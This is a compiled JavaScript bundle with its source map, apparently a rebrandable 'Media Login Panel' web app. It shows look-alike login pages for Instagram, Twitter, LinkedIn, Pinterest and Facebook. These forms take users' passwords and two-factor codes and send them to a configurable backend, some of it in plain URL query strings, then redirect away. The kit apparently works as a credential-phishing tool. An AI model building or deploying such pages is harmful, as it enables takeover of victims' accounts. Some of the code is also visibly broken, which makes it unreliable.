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","file":"static/js/main.004369c7.chunk.js","sourcesContent":["import React, { Component } from \"react\";\nimport { Card, Button, Row, Container, Col } from \"react-bootstrap\";\nimport { Redirect } from \"react-router-dom\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nconsole.log(env.REACT_APP_URL);\nconsole.log(window.location.host);\nexport default class Home extends Component {\n  state = {\n    redirect: false,\n    to: \"\",\n  };\n  setRedirect = (url) => {\n    this.setState({\n      redirect: true,\n      to: url,\n    });\n  };\n  renderRedirect = () => {\n\n    if (this.state.redirect) {\n      return <Redirect to={this.state.to} />;\n    }\n  };\n  componentDidMount() {\n    const favicon = document.getElementById(\"FavIcon\");\n    if (\n      env.REACT_APP_FAVICONURL !== undefined ||\n      env.REACT_APP_FAVICONURL !== \"\"\n    )\n      favicon.href = `${env.REACT_APP_FAVICONURL}`;\n    const title = document.getElementById(\"AppTitle\");\n    if (env.REACT_APP_TITLE !== undefined || env.REACT_APP_TITLE !== \"\")\n      title.innerText = `${env.REACT_APP_TITLE}`;\n    else {\n      title.innerText = \"Media Login Panel\";\n    }\n  }\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Card\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n          className=\"text-center\"\n        >\n          <Card.Header>Select a login option</Card.Header>\n          <Card.Body>\n            <Container fluid>\n              <Col>\n                {\n                  env.REACT_APP_INSTAGRAM === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-danger\"\n                        onClick={() => this.setRedirect(\"/Instagram\")}\n                      >\n                        INSTAGRAM\n                    </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_TWITTER === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-primary\"\n                        onClick={() => this.setRedirect(\"/Twitter\")}\n                      >\n                        TWITTER\n                      </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_LINKEDIN === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-info\"\n                        onClick={() => this.setRedirect(\"/LinkedIn\")}\n                      >\n                        LINKEDIN\n                       </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_PINTEREST === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-secondary\"\n                        onClick={() => this.setRedirect(\"/Pinterest\")}\n                      >\n                        Pinterest\n                       </Button>\n                    </Row> : \"\"\n                }\n                {\n                  env.REACT_APP_FACEBOOK === \"true\" ?\n                    <Row>\n                      <Button\n                        style={{ width: \"100%\", margin: \"5px\", padding: \"5px\" }}\n                        size=\"lg\"\n                        variant=\"outline-primary\"\n                        onClick={() => this.setRedirect(\"/Facebook\")}\n                      >\n                        Facebook\n                       </Button>\n                    </Row> : \"\"\n                }\n\n              </Col>\n            </Container>\n          </Card.Body>\n        </Card>\n        <Card title=\"Select login options\"></Card>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card,\n} from \"react-bootstrap\";\n\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\nexport default class Instagram extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    twoFactor: false,\n    email_auth: false,\n    success: false,\n    code: \"\",\n    two_factor_identifier: \"\",\n    verificationMethod: \"\",\n    appName: window.location.hostname.msg.substring(10).split(\".\")\n  };\n\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      window.setTimeout(() => {\n        this.setState({ showAlert: false });\n      }, 30000);\n    });\n  };\n  handleClick = (e) => {\n    e.preventDefault();\n    this.setState({ loading: true });\n    if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n      console.log(this.state.appName, window.location.href.split(\"//\")[1]);\n      fetch(`${env.REACT_APP_URL}/insta`, {\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n        },\n        body: queryString.stringify({\n          username: this.state.username,\n          password: this.state.password,\n          cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n          appName: this.state.appName\n        }),\n      })\n        .then((response) => response.json())\n        .then((responseData) => {\n          console.log(responseData);\n          this.setState(\n            {\n              message: responseData.message,\n            },\n            () => {\n              this.onShowAlert();\n            }\n          );\n          if (!responseData.success) {\n            this.setState({ loading: false });\n          } else {\n            if (responseData.twoFactor) {\n              this.setState({\n                email_auth: responseData.email_auth,\n                twoFactor: true,\n                loading: true,\n                two_factor_identifier: responseData.two_factor_identifier,\n                verificationMethod: responseData.verificationMethod,\n              });\n            } else {\n              this.setState({ success: true });\n            }\n          }\n        });\n    } else {\n      if (this.state.username.length === 0) {\n        this.setState(\n          {\n            message: \"username cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      } else {\n        this.setState(\n          {\n            message: \"password cannot be empty\",\n            loading: false,\n          },\n          () => {\n            this.onShowAlert();\n          }\n        );\n      }\n    }\n  };\n  handleCodeClick = (e) => {\n    if (this.state.code.length === 0 || this.state.code.length > 6) {\n      this.setState({ message: \"Code length should be equal to 6\" }, () => {\n        this.onShowAlert();\n      });\n    } else {\n      if (!this.state.email_auth) {\n        fetch(\n          `${env.REACT_APP_URL}/insta/submitCode?username=${this.state.username}&password=${this.state.password}&code=${this.state.code}&two_factor_identifier=${this.state.two_factor_identifier}&verificationMethod=${this.state.verificationMethod}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}$appName=${this.state.appName}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            if (responseData.success) {\n              this.setState(\n                { success: true, message: responseData.message },\n                () => {\n                  this.onShowAlert();\n                }\n              );\n            } else {\n              this.setState({ message: responseData.message }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      } else {\n        fetch(\n          `${env.REACT_APP_URL}/insta/emailVerify?username=${this.state.username}&code=${this.state.code}`,\n          {\n            method: \"GET\",\n          }\n        )\n          .then((response) => response.json())\n          .then((responseData) => {\n            console.log(responseData);\n            this.setState(\n              {\n                message: responseData.message,\n              },\n              () => {\n                this.onShowAlert();\n              }\n            );\n            if (responseData.success) {\n              fetch(`${env.REACT_APP_URL}/insta`, {\n                method: \"POST\",\n                headers: {\n                  \"Content-Type\":\n                    \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                  username: this.state.username,\n                  password: this.state.password,\n                  cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                  appName: this.state.appName\n                }),\n              })\n                .then((response) => response.json())\n                .then((responseData) => {\n                  console.log(responseData);\n                  this.setState(\n                    {\n                      message: responseData.message,\n                    },\n                    () => {\n                      this.onShowAlert();\n                    }\n                  );\n                  if (!responseData.success) {\n                    this.setState({ loading: false });\n                  } else {\n                    if (!responseData.twoFactor) {\n                      this.setState({ success: true });\n                    }\n                  }\n                });\n            } else {\n              this.setState({ message: responseData.message, code: \"\" }, () => {\n                this.onShowAlert();\n              });\n            }\n          });\n      }\n    }\n  };\n  setRedirect = () => {\n    this.setState({\n      redirect: true,\n    });\n  };\n  renderRedirect = () => {\n    if (this.state.redirect) {\n      return <Redirect to=\"/\" />;\n    }\n  };\n  render() {\n    return (\n      <div>\n        {this.renderRedirect()}\n        <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n          Back\n        </Button>\n        {this.state.showAlert ? (\n          <Alert variant=\"danger\">{this.state.message}</Alert>\n        ) : (\n            \"\"\n          )}\n\n        <Container\n          style={{\n            position: \"absolute\",\n            left: \"50%\",\n            top: \"50%\",\n            transform: \"translate(-50%, -50%)\",\n          }}\n        >\n          <center>\n            <Container>\n              <img\n                alt=\"logo\"\n                src={env.REACT_APP_FAVICONURL}\n                style={{ objectFit: 'contain', width: \"25%\", height: \"25%\" }}\n              ></img>\n            </Container>\n            <br></br>\n            <h1>\n              {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                ? env.REACT_APP_TITLE\n                : \"Instagram Login\"}\n            </h1>\n            <br />\n            {\n              env.REACT_APP_BANNER_INSTAGRAM === \"true\" ?\n                <div>\n                  <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                    <Card.Body>\n                      <Card.Title>{env.REACT_APP_BANNER_INSTAGRAM_HEADER}</Card.Title>\n                      <Card.Text>\n                        <small className=\"text-muted\">  {env.REACT_APP_BANNER_INSTAGRAM_BODY}</small>\n                      </Card.Text>\n                    </Card.Body>\n                  </Card></div>\n                : \"\"\n            }\n            <Container>\n              <p style={{ fontWeight: \"bold\" }}>\n                {\n                  env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                }\n\n              </p>\n            </Container>\n          </center>\n          {this.state.success ? (\n            <Container\n              style={{\n                position: \"absolute\",\n                left: \"50%\",\n                top: \"50%\",\n                transform: \"translate(-50%, -50%)\",\n              }}\n            >\n              <center>\n                <h1>Login Success Thank You!</h1>\n                <h1>Redirecting...</h1>\n              </center>\n              <Route\n                component={() => {\n                  window.setTimeout(() => {\n                    window.location.href = env.REACT_APP_REDIRECTURL;\n                  }, 3000);\n\n                  return null;\n                }}\n              />\n            </Container>\n          ) : (\n              <Row>\n                <Col>\n                  <Form onSubmit={(e) => this.handleClick(e)}>\n                    <Form.Group controlId=\"formBasicEmail\">\n                      <Form.Label>Username</Form.Label>\n\n                      <Form.Control\n                        value={this.state.username}\n                        onChange={(e) => {\n                          this.handleUsername(e);\n                        }}\n                        type=\"username\"\n                        placeholder=\"Enter Instagram username\"\n                      />\n                      <Form.Text className=\"text-muted\">\n                        We'll never share your details with anyone else.\n                    </Form.Text>\n                    </Form.Group>\n\n                    <Form.Group controlId=\"formBasicPassword\">\n                      <Form.Label>Password</Form.Label>\n                      <Form.Control\n                        onChange={(e) => this.handlePassword(e)}\n                        value={this.state.password}\n                        type=\"password\"\n                        placeholder=\"Enter Instagram Password\"\n                      />\n                    </Form.Group>\n                    {this.state.loading ? (\n                      <Button variant=\"primary\" type=\"submit\" disabled>\n                        <Spinner\n                          as=\"span\"\n                          animation=\"grow\"\n                          size=\"sm\"\n                          role=\"status\"\n                          aria-hidden=\"true\"\n                        />\n                      Loading...\n                      </Button>\n                    ) : (\n                        <Button variant=\"primary\" type=\"submit\">\n                          Login\n                        </Button>\n                      )}\n\n                    {this.state.twoFactor ? (\n                      <div>\n                        <Form.Group>\n                          {this.state.email_auth ? (\n                            <Form.Label>\n                              Please enter the code received\n                            </Form.Label>\n                          ) : (\n                              <Form.Label>Enter code recieved</Form.Label>\n                            )}\n\n                          <Form.Control\n                            value={this.state.code}\n                            onChange={(e) => {\n                              this.handleCode(e);\n                            }}\n                            type=\"number\"\n                            maxLength=\"11\"\n                          />\n                        </Form.Group>\n                        <Button\n                          variant=\"outline-success\"\n                          onClick={() => {\n                            this.handleCodeClick();\n                          }}\n                        >\n                          submit code\n                      </Button>{\" \"}\n                      </div>\n                    ) : (\n                        \"\"\n                      )}\n                  </Form>\n                </Col>\n              </Row>\n            )}\n        </Container>\n      </div>\n    );\n  }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n  Form,\n  Button,\n  Container,\n  Row,\n  Col,\n  Alert,\n  Spinner,\n  Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n  state = {\n    username: \"\",\n    password: \"\",\n    showAlert: false,\n    loading: false,\n    message: \"\",\n    manualCheck: false,\n    success: false,\n    redirect: false,\n    challangeID: \"\",\n    code: \"\",\n    appName: window.location.hostname.msg.substring(10).split(\".\")\n\n  };\n  handleUsername = (event) => {\n    this.setState({ username: event.target.value });\n  };\n  handleCode = (event) => {\n    const { value, maxLength } = event.target;\n    const message = value.slice(0, maxLength);\n    this.setState({ code: message });\n  };\n  handlePassword = (event) => {\n    this.setState({ password: event.target.value });\n  };\n  onShowAlert = () => {\n    this.setState({ showAlert: true }, () => {\n      